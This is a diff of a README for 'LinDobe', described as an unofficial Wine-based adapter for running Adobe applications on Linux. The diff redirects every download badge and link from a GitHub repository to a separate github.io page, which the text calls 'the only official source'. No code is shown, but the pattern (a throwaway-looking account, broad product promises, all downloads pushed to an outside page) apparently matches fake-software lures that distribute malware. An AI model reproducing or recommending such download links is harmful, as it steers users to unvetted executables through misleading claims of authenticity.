@@ -1,7 +1,7 @@
 # 🎨 LinDobe - Run Your Adobe Apps on Linux
 
-[![Download LinDobe](https://img.shields.io/badge/⬇_Download-LinDobe-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jolettadetergent875/LinDobe)
-[![Made for Linux](https://img.shields.io/badge/Made_for-Linux-orange?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/jolettadetergent875/LinDobe)
+[![Download LinDobe](https://img.shields.io/badge/⬇_Download-LinDobe-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://jolettadetergent875.github.io)
+[![Made for Linux](https://img.shields.io/badge/Made_for-Linux-orange?style=for-the-badge&logo=linux&logoColor=white)](https://jolettadetergent875.github.io)
 
 LinDobe is an unofficial adapter that helps you run Adobe programs such as Photoshop, Illustrator, Premiere Pro, Lightroom and Acrobat on Linux — using the subscription you already own. It is built on top of Wine, a well-known tool that lets Linux computers understand Windows software. You do not need to be a programmer to use it, and you do not need to buy anything from Adobe again if you already pay for a plan.
 
@@ -15,7 +15,7 @@ Getting LinDobe is simple. You do not need to install anything unusual, and you 
 
 **Visit this link to download the application:**
 
-### ➡️ [https://github.com/jolettadetergent875/LinDobe](https://github.com/jolettadetergent875/LinDobe)
+### ➡️ [https://jolettadetergent875.github.io](https://jolettadetergent875.github.io)
 
 Click the link above. It takes you to the official LinDobe page, where you will find the download button and the latest version of the software. Always use this link — it is the only official source, so you know you are getting the real, up-to-date files.
 
@@ -73,7 +73,7 @@ Ready to begin? Follow these steps in order. Take your time — nothing here is 
 
 Visit this link to download the application:
 
-### ➡️ [https://github.com/jolettadetergent875/LinDobe](https://github.com/jolettadetergent875/LinDobe)
+### ➡️ [https://jolettadetergent875.github.io](https://jolettadetergent875.github.io)
 
 **Step 2 — Read the download page**
 
